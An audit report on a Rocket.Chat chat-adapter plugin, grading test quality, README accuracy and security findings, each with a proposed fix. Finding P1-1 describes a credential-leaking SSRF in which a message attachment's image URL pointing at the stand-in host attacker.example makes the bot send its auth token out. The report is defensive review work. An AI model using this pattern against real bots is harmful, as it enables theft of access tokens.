# Audit — Hermes Rocket.Chat adapter: test quality, docs accuracy, security posture

Scope reviewed: the complete self-contained plugin — `adapter.py` (3344 lines, read in full), all of `tests/` (17 test files + `conftest.py`, **196 tests, executed: 196 passed in 4.29 s** in this environment), `README.md` (328 lines), `plugin.yaml` (96 lines), `pyproject.toml`, and `docs/plans/*.md`. Every claim below was verified against actual code/docs; no speculation. Runtime note: this machine has `~/.hermes/hermes-agent` installed, so `adapter.py` imports the **real** `gateway.platforms.base` (not the internal stub) — that import split is itself an environment-dependence finding (P3-5).

Companion report: HTTP/REST + transport findings (session reuse, missing timeouts, DDP `result.error`, sync flush, outbound-429 handling) are covered in `AUDIT_rocketchat_http_transports.md` and are **not** duplicated here; overlaps are flagged inline.

## P0 — must-fix before trusting the adapter

**None found.** Both P0 candidates were traced end-to-end and rejected:

- **Allowlist is NOT enforced by the plugin, but IS enforced by the Hermes gateway at dispatch.** `_on_inbound` (adapter.py:2771-2898) performs zero sender authorization; grep shows `allowed_users`/`allow_all` only at parse (136-147), `env_enablement` (231-235) and `register` declarations (3335-3336). However, the gateway `authz_mixin.py:820` runs `if user_id in allowed or "*" in allowed` against `source.user_id` (the Rocket.Chat user id) on every dispatched event, keyed off the registration metadata the plugin declares (`allowed_users_env="ROCKETCHAT_ALLOWED_USERS"`, `allow_all_env="ROCKETCHAT_ALLOW_ALL_USERS"`, adapter.py:3335-3336). So in the plugin's only supported runtime (Hermes gateway), the allowlist *is* live at inbound dispatch time — downgraded to a defense-in-depth note (P3-6).
- **Credentials are never placed in URLs, logs, or cache keys** (see "Verified-correct" — the password/token only travel in JSON bodies and headers).

## P1 — real deployment risk

### P1-1. Inbound attachment download exfiltrates bot credentials to arbitrary hosts and is an SSRF vector
`download_attachment`, adapter.py:765-777:
```python
headers = {
    "X-User-Id": self._user_id,
    "X-Auth-Token": self._access_token,
}
...
resp = await _maybe_await(session.get(url, headers=headers))
```
The URL is attacker-influenced message content: `attachment_candidates_from_message` takes `att.get("image_url") or att.get("title_link")` verbatim (adapter.py:877), and `resolve_message_media` calls `client.download_attachment(candidate.url)` for every candidate with a URL (adapter.py:998). Anyone who can DM the bot (DMs bypass all mention gating, adapter.py:2827-2850) can post a message whose attachment carries `image_url: https://attacker.example/collect` and force the bot to GET it with **the bot's auth token attached**. There is no scheme/host validation, no `allow_redirects=False`, no origin check. aiohttp's default GET follows up to 10 redirects and re-sends request headers on every hop, so the credentials also follow a `307` from Rocket.Chat's `/file-upload/...` to its storage backend (S3/Azure signed URL), leaking the token to that host. The existing test only asserts the headers *are sent*, never that they are scoped: `test_download_attachment_uses_auth_headers`, tests/test_client.py:333-361.
**Fix:** scope downloads to the configured server origin (`urljoin(server_url, url)`), use `allow_redirects=False` with manual single-hop validation, and strip `X-User-Id`/`X-Auth-Token` on cross-origin hops.

### P1-2. Outbound media upload sends JSON metadata only, never file bytes — the README's core outbound claim is false, and the host path is disclosed
`upload_attachment`, adapter.py:809-813:
```python
upload_result = await self._request(
    "POST", f"/api/v1/rooms.media/{room_id}",
    json={"file_name": file_name, "file_path": str(path)},
)
```
Rocket.Chat's `rooms.media/{roomId}` expects **multipart form-data with the file bytes**; a JSON `{file_name, file_path}` request cannot create an uploadable file on a real server (same root cause as `AUDIT_rocketchat_http_transports.md` P0-1). The code admits it only in a docstring (adapter.py:793-799: "The current implementation sends file metadata as JSON so that tests with mock HTTP sessions can exercise the full flow"), yet `_send_media_file` (adapter.py:2468-2515) returns `success=True` for every `send_image_file`/`send_document`/`send_video`/`send_voice`/`send_image`/`send_multiple_images`. README.md:277-282 ("file attachments from the agent arrive as real downloads — no 'couldn't deliver' fallbacks") is therefore false end-to-end. Secondary disclosure: the **full host filesystem path** (`file_path: /home/…/image.png`) is transmitted to the Rocket.Chat server in the JSON body (server logs/audit/admin-visible). Tests assert only that the fake client received `file_path` (tests/test_media_outbound.py:96-103) — none asserts a multipart body.
**Fix:** implement a form-data path (`aiohttp.FormData` `data=` / `httpx files=`) carrying real bytes, drop `file_path` from the payload, then update README.md:277-282 and close v0.2 plan M2/M1 acceptance (below).

## P2 — quality / correctness cleanup

### P2-1. `get_chat_info` can never return real metadata; the test masks the defect
`get_chat_info`, adapter.py:3066-3070, only reads `self._room_info` — which **no adapter code ever writes** (grep: `_room_info` appears only at init 1945, read 3069, and in tests). The tests seed the dict manually ("Seed some room info", tests/test_adapter.py:506-531; also test_caches.py:54-68), so they pass vacuously while production always returns `{}` and never calls `client.room_info(chat_id)`.
**Fix:** populate `_room_info[chat_id]` from `client.room_info()` on miss (bounded), and add a test with a fake client answering `rooms.info`.

### P2-2. Inbound `file`/`files`-field attachments can never download: relative URLs are never origin-joined
`_file_url_from_rc` (adapter.py:913-919) returns relative URLs (`/file-upload/{rid}/{fid}/{name}`), and `download_attachment` passes them to `session.get(...)` unfixed — verified: aiohttp raises `InvalidUrlClientError: /file-upload/...`. `resolve_message_media` swallows it (`except Exception` → warning → continue, adapter.py:1001-1007), so with `ROCKETCHAT_MEDIA_CACHE_DIR` set, every modern `files`/`file` attachment is silently dropped; without it, the relative URL is passed through as `media_urls` (adapter.py:1008-1009), equally unusable. No test passes `cache_dir` to `resolve_message_media` at all (grep: zero `media_cache_dir` uses in tests/). README.md:270-271 ("Protected Rocket.Chat file URLs are downloaded with auth headers to a configurable cache directory") is only true for absolute `attachments[].image_url` values. (Root cause also reported as P1-3 in `AUDIT_rocketchat_http_transports.md`.)
**Fix:** `urljoin(client.server_url, candidate.url)` before download.

### P2-3. `send()` drops the entire reply when placeholder consumption fails
In `send` (adapter.py:2281-2292) the first chunk *edits* the thinking placeholder via `update_message`; if that raises (e.g. the placeholder message was deleted by another client → Rocket.Chat 400), the exception lands in the outer handler (2313-2322) and the **whole multi-chunk reply is lost** — no fallback to `post_message`, and no test covers this path.
**Fix:** on first-chunk `update_message` failure, fall back to `post_message` and clear the placeholder bookkeeping; add a deleted-placeholder regression test.

### P2-4. Orphaned "💭 Thinking…" bubble when the final send lacks `notify`/`expect_edits`
`stop_typing` only clears `_stream_previews` and deliberately keeps the placeholder (adapter.py:2229-2239); `_should_consume_typing_placeholder` (2153-2167) returns False for any metadata without those flags. **Verified by execution:** `send_typing → stop_typing → send("final answer")` (no metadata) leaves `💭 Thinking…` posted permanently in the room and retained in `_typing_placeholders`. No test covers this interaction (all placeholder tests use `notify`/`expect_edits`).
**Fix:** consume/delete the placeholder on any successful final send for that (chat, thread), or document the requirement.

### P2-5. `list_subscriptions(updated_since=…)` builds the param but never sends it
adapter.py:703-709: `params["updatedSince"] = updated_since` is built, then line 708 calls `self._request("GET", "/api/v1/subscriptions.get")` — `params` is never passed. Currently invisible because `poll_once` calls it with no args (1239) and tests record the *caller's* argument (tests/test_polling.py:53-55). (Also reported as P1-6 in the HTTP audit.)
**Fix:** pass `params=params`; have `poll_once` pass its oldest checkpoint.

### P2-6. `ROCKETCHAT_FORCE_THREAD` is parsed but never used; README thread claims contradict `_resolve_tmid`
`force_thread` is defined (adapter.py:42) and parsed (136-137) and has **no other reference anywhere** (grep-verified). README.md:228 documents it as working ("always reply in threads"), and README.md:203-206 claims "Channel/group replies are posted as **thread replies** anchored to the triggering message" — but `_resolve_tmid` (adapter.py:2385-2404) deliberately returns `tmid=""` for gateway sends (metadata present), explicitly commented: "in Rocket.Chat that would hide normal replies inside threads. Only use reply_to as tmid for direct adapter callers that did not provide gateway metadata." So gateway-driven replies are **not** threaded, contradicting the README.
**Fix:** either wire `force_thread` into `_resolve_tmid` or remove it from README/parse_config; correct README.md:203-206.

### P2-7. `_request` returns `resp.json()` unguarded — a `None`/empty 2xx body crashes every caller
adapter.py:546 returns whatever `json()` yields; every caller immediately does `data.get(...)` (564, 815, 842), so a 2xx with an empty body is an `AttributeError`, not a `RocketChatClientError`. The two fake shapes disagree and hide this: tests/test_client.py:25-28 raises on `json_data=None`, tests/test_standalone_sender.py:26-27 returns `None`.
**Fix:** normalize `None`/non-dict `json()` results into an error (or `{}`) inside `_request`; unify the fake response shapes.

### P2-8. Test-coverage gaps (test-name vs method cross-check; no test at all for:)
- `_on_transport_status` (adapter.py:2014-2035) — grep finds zero references in tests/.
- `_message_type_for_media` (adapter.py:3024-3042).
- `_request` `raw=True` branch (521-528) — which is also **dead code** (no caller passes `raw=True`).
- Client-level `update_message`/`get_message` success and error paths (only exercised through adapter-level fakes).
- `upload_attachment` file-not-found and empty-`file_id` (skip-confirm) paths.
- `PersistentSeenIdStore` corrupt-file recovery — `_load` handles `json.JSONDecodeError`/`OSError` (1091-1095) but no test writes a garbage file (only "atomic write" is tested, test_adapter.py:619-630).
- `resolve_delivery_target` cache-behavior — no test asserts a second resolve skips the network (tests clear the module cache, test_standalone_sender.py:414-416).
- The real `connect()` success path — test_adapter.py:107-116 replaces `adapter.connect` with a fake, so real client creation, transport `start()`, and `_wire_plugin_handlers` are never exercised.
- `_poll_loop`'s 429 branch — only `_sleep_after_error` is tested (test_polling.py:72-78); the loop's `except RocketChatRateLimitError` (1217-1226) is not.
- `resolve_message_media` with a `cache_dir` (see P2-2).
- `send` placeholder-consumption failure (P2-3) and the non-`notify` send (P2-4).

### P2-9. Real network in tests: slow, environment-dependent, weakest-possible assertions
tests/test_standalone_sender.py:153-190 (`test_standalone_send_text_only`, `test_standalone_send_media_files_is_callable`) construct a **real** `RocketChatClient` and call `initialize()` — measured here: **1.38 s and 1.30 s** of genuine DNS/TCP attempts. The code comment admits it: "Without a real client, we expect either an error or a timeout", and the assertions are `isinstance(result, dict)` + `"success" in result or "error" in result`. Where `chat.example.com` resolves (corporate DNS wildcards/proxies) an unresponsive endpoint can hang up to aiohttp's 5-minute default total timeout; offline CI depends on DNS-failure latency (fast here, not guaranteed).
**Fix:** route both through `_client_factory=` with a fake session.

### P2-10. Duplicated/inconsistent fake stacks + environment-dependent test outcomes (conftest/import split)
Four near-identical fake stacks: `FakeResponse`/`FakeSession`/`FakeClient` (test_client.py:17-91), `FakeUploadResponse`/`FakeUploadSession`/`FakeUploadClient` (test_standalone_sender.py:19-84), `FakeClient`/`FakeTransport` (test_adapter.py:18-80), plus per-file `FakeClient` copies (test_streaming.py:17-51, test_capabilities.py:14-41, test_status_text.py:18-44, test_media_outbound.py:18-50), with contradictory `json()` semantics (P2-7). `conftest.py` itself is clean — only the 3-line repo-root `sys.path` shim (conftest.py:1-3). The real environment coupling is in **adapter.py:1305-1318**: it inserts `~/.hermes/hermes-agent` into `sys.path` and conditionally imports real `gateway.*` or falls back to internal stubs (adapter.py:1330-1440). This suite genuinely runs different code with/without Hermes installed: here the real branch (real `MessageEvent`, `build_source`, `_set_fatal_error`, authz); elsewhere the stub branch (different `MessageEvent` constructor, dict-source `_build_message_event` path at adapter.py:2973-2992 vs object path 2994-3022). The recently-fixed fatal-property coupling (commit `c8f10f2`) is evidence of this seam; a Hermes version skew (e.g. `media_text_inlined` removed from `MessageEvent`, present at base.py:2466 in the installed tree) breaks one environment while passing the other.
**Fix:** consolidate fakes into a shared tests helper module; pin the Hermes base version or add a CI job without Hermes to lock the stub branch.

## P3 — hardening / notes

- **P3-1** Server-controlled response bodies flow into exceptions → logs → gateway fatal state: `_request` embeds `body[:200]` in errors (adapter.py:532); `_verify_token`/`_login_password` wrap them (562, 586); `_mark_auth_fatal` forwards them into `fatal_error_message` (2763); `standalone_send` logs `exc` (3284). No password/token value is itself ever logged or placed in URLs (verified, see below), but a malicious server can inject content into logs/fatal state. Truncate/sanitize body-derived text.
- **P3-2** `_is_auth_error` substring heuristic (adapter.py:1734-1744) matches any error containing "auth"/"token"/"resume" — a transient error mentioning "token" triggers a needless re-auth; a differently-phrased real auth failure is missed.
- **P3-3** `_login_password` passes `headers={}` intending "no auth headers yet" (adapter.py:583), but `_request` merges it into defaults that always carry `X-User-Id`/`X-Auth-Token` (505-510) — stale headers are sent on `/api/v1/login`. Harmless today (same as HTTP audit P2-1).
- **P3-4** `sanitize_filename` (adapter.py:955-962) is safe against traversal (`/`,`\`,NUL, control chars, leading dots — verified by tests/test_attachments.py:140-151) but has **no length cap** (a 10k-char title → `ENAMETOOLONG` at write, swallowed → attachment skipped) and **no Windows reserved-name handling** (`CON`, `NUL`, ...); `dest.parent.mkdir` at adapter.py:995 sits **outside** the try at 997, so an unwritable cache dir raises out of `resolve_message_media` and kills inbound delivery of that message.
- **P3-5** `_split_long_text` infinite-loops when `ROCKETCHAT_MAX_MESSAGE_LENGTH=0` (adapter.py:2453-2461: `remaining[:0]` never shrinks) — edge config only.
- **P3-6** Allowlist defense-in-depth: the plugin itself has zero authorization checks (P0 note); README.md:160-173 correctly attributes enforcement to the gateway, but a direct `_on_inbound` gate on `sender_id ∈ allowed_users` would protect non-gateway embeddings.
- **P3-7** `send_image` error surfaces the first 80 chars of the source URL in `SendResult.error` (adapter.py:2677-2678) — minor info exposure in error paths; no fix required, note only.

## Verified-correct items (checked, no issue found)
- **README config defaults** match `parse_config`: `ROCKETCHAT_POLL_INTERVAL_SECONDS` default `3` (README.md:103-107 vs adapter.py:120-124), `ROCKETCHAT_RECEIVE_TIMEOUT` default `60` (README.md:116-117 vs adapter.py:153-157), ping/backoff/jitter defaults (README.md:122-140 vs adapter.py:158-182), dedup defaults (README.md:150-155 vs adapter.py:183-195).
- **Install flow:** `hermes plugins install <owner/repo>` exists (hermes-agent cli.py:12907) — README.md:24-28 accurate.
- **Cron user→DM resolution** (README.md:220-223) is real: `resolve_delivery_target` (adapter.py:3147-3197), tested (test_standalone_sender.py:268-433).
- **Streaming preview, status text, capability flags, reply-context backfill, dedup store, reconnect/heartbeat, 429-in-poll-loop:** implemented and covered by focused tests (test_streaming.py, test_status_text.py, test_capabilities.py, test_reply_context.py, test_adapter.py:576-753, test_websocket.py:412-656, test_polling.py:72-78).
- **Secrets handling:** no `password`/`access_token` value appears in any log string, exception construction, cache key, or message body; credentials travel only in `X-User-Id`/`X-Auth-Token` headers and the login JSON body (adapter.py:505-510, 582, 767-770); `_delivery_room_cache` keys/values are targets and room ids only (3144, 3147-3197).

## docs/claims to fix

| Claim | Evidence | Status |
|---|---|---|
| README.md:15-16 "Downloads, classifies, and forwards Rocket.Chat attachments … uploads outbound media files … into Rocket.Chat rooms" | inbound `files`-field downloads fail on relative URLs (adapter.py:913-919; aiohttp `InvalidUrlClientError`); outbound upload sends no bytes (adapter.py:809-813) | **False / broken** |
| README.md:270-271 "Protected Rocket.Chat file URLs are downloaded with auth headers to a configurable cache directory" | only absolute `attachments[].image_url`; `files`/`file`-field URLs never download; headers also leak cross-host (P1-1) | **Misleading** |
| README.md:277-282 "every outbound media send … so file attachments from the agent arrive as real downloads" | JSON-metadata-only upload; `rooms.media` requires multipart | **False** |
| README.md:203-206 "Channel/group replies are posted as **thread replies** anchored to the triggering message" | `_resolve_tmid` returns `""` for gateway sends (adapter.py:2385-2404); code comment contradicts the README | **False for gateway path** |
| README.md:228 "ROCKETCHAT_FORCE_THREAD=true # always reply in threads" | parsed (adapter.py:136-137) but never used anywhere | **Dead config documented as live** |
| README.md:230 `ROCKETCHAT_MAX_MESSAGE_LENGTH` | genuinely used (adapter.py:148-152, 2269, 2355) — but `0` → infinite loop (P3-5) | **Accurate; document bounds** |
| plugin.yaml `optional_env` (lines 16-96) vs the 26 `ROCKETCHAT_*` keys `parse_config`/`register` read (adapter.py:109-194, 3334-3337) | optional_env declares 20 + requires_env 2 | **Missing 4 optional keys**: `ROCKETCHAT_POLL_INTERVAL_SECONDS` (122), `ROCKETCHAT_FORCE_THREAD` (137), `ROCKETCHAT_MEDIA_CACHE_DIR` (141), `ROCKETCHAT_MAX_MESSAGE_LENGTH` (150) — all read by code and all in the README (107, 228-230), never surfaced in plugin.yaml. No extra/typo keys; `ROCKETCHAT_ACCESS_TOKEN`/`ROCKETCHAT_PASSWORD` correctly `password: true` |
| docs/plans/2026-07-23 v0.2 plan M2/M1 acceptance (line 106): "在真实 Rocket.Chat 上验证：MEDIA 指令传文件、长回复实时增长、工具状态可见、代码块正常渲染" | code cannot upload real files (P1-2); no integration artifact exists in the repo; the JSON-only workaround is documented only in the code docstring (adapter.py:793-799) | **Acceptance claimed without backing** |
| docs/plans/2026-06-29 implementation doc line 618 "upload_attachment … calls `rooms.media` and `rooms.mediaConfirm`" | true, but omits the JSON-not-multipart reality present since v0.1 | **Understates** |

## Fix-first list (max 5, only confirmed defects)
1. **Real multipart upload** (P1-2): implement a form-data path in `_request`/`upload_attachment` (aiohttp `FormData` as `data=`, httpx `files=`), send real bytes, drop `file_path` from the payload; update README.md:277-282 and the v0.2 plan acceptance.
2. **Scope attachment downloads** (P1-1 + P2-2): origin-join relative `/file-upload/...` URLs (`urljoin(server_url, url)`), add `allow_redirects=False` with manual hop validation, strip `X-User-Id`/`X-Auth-Token` on cross-origin redirects.
3. **Make `send()` placeholder handling lossless** (P2-3 + P2-4): fall back to `post_message` when the first-chunk edit fails; consume/delete the placeholder on any successful final send; add regression tests for both.
4. **Resolve the dead/misleading config surface** (P2-6 + P2-5): wire `ROCKETCHAT_FORCE_THREAD` into `_resolve_tmid` or remove it; pass `params` in `list_subscriptions` and add a client-level test asserting `updatedSince` on the wire.
5. **Delete the network-dependent tests and complete the coverage gap set** (P2-9 + P2-8): route `test_standalone_send_*` through `_client_factory` fakes; add tests for `get_chat_info` populating via `client.room_info` (after fixing P2-1), `PersistentSeenIdStore` corrupt-file recovery, `_on_transport_status`, the real `connect()` success path, and `resolve_message_media` with a `cache_dir`.

---

*Evidence notes: line numbers refer to the current files (`adapter.py` 3344 lines; tests as of commit `c8f10f2`). Findings were verified by reading code/docs and by executing the suite (196 passed; the two standalone-sender tests measured 1.38 s/1.30 s of real network time). The HTTP/REST-layer findings overlap `AUDIT_rocketchat_http_transports.md` and are not restated here.*